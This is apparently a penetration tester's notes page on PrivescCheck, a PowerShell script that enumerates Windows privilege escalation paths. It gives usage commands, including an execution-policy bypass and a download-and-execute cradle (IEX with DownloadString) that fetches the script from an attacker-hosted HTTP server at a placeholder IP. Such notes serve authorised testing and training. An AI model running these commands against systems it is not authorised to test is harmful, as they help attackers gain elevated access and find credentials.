---
tags: [tool, privesc, windows, powershell]
tool: "privesccheck"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# PrivescCheck - Windows Privilege Escalation Checker

## Tool Overview
Purpose: PowerShell script for comprehensive Windows privilege escalation checks
Location: ~/tools/privesc/windows/PrivescCheck/PrivescCheck.ps1

## When to Use
- Alternative to winpeas
- For deep PowerShell-based enumeration
- When you need detailed reporting

## How to Use It

Basic Usage:
powershell -ep bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck

Extended Checks:
Invoke-PrivescCheck -Extended

Export Report:
Invoke-PrivescCheck -Report PrivescCheck-Report

Quiet Mode:
Invoke-PrivescCheck -Quiet

Transfer to Target:
On Kali: cd ~/tools/privesc/windows/PrivescCheck && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/PrivescCheck.ps1'); Invoke-PrivescCheck"

## What It Finds
- Service misconfigurations
- Registry checks
- File permission issues
- Credential leaks
- System vulnerabilities
- UAC bypasses

## Related Tools
winpeas, powerup
